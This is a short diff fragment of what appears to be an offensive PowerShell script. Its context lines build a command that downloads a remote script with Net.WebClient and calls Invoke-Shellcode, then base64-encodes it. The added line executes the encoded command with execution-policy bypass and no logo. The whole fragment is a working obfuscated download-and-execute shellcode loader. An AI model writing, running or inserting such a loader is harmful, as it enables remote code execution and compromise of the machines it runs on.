@@ -16,3 +16,4 @@ $rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode
 Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
 $obfscmd = [Convert]::ToBase64String($bytes)
+Powershell.exe -Exec Bypass -Nol -Enc $obfscmd
